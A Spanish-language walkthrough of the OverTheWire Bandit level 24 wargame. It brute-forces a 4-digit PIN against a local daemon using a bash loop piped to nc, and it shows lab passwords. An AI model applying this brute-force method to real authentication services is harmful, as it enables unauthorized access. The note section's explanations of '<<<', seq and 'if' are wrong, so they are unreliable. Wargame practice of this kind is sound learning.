
# Objetivo

Un demonio está escuchando en el puerto 30002 y le dará la contraseña de bandit25 si se le da la contraseña de bandit24 y un código PIN numérico secreto de 4 dígitos. No hay forma de recuperar el código PIN excepto revisando todas las 10000 combinaciones, lo que se denomina fuerza bruta.
No es necesario crear nuevas conexiones cada vez.
## Datos de acceso al nivel
Host al que se va a conectar: **bandit.labs.overthewire.org**.
Puerto: **2220**.
Usuario: **bandit24**.
Contraseña: Encontrada en el nivel anterior: `VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar`.

## Solución
```
bandit24@bandit:~$ nc localhost 30002 <<< VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 1234
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Fail! You did not supply enough data. Try again.
^C
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0001
...
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 9998
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 9999
bandit24@bandit:~$ 
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
...
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:~$ 

```

## Notas adicionales

- `nc` -> Permite acceder a puertos TCP o UDP de la propia u otras maquinas remotas.
- `<<<` -> Pasa al directorio que se encuentra en la izquierda, el contenido de la parte de la derecha.
- `seq` -> Ayuda a crear secuencias. (`seq + primer # + segundo #`)
- `echo` -> Imprime texto en pantalla.
- Se pueden crear if en la consola de comandos, se usa para mandar todas las combinaciones posibles al puerto 30002 y hasta que acertara la contrasena correcta.
## Referencias

cron, crontab, crontab(5) (use “man 5 crontab” to access this)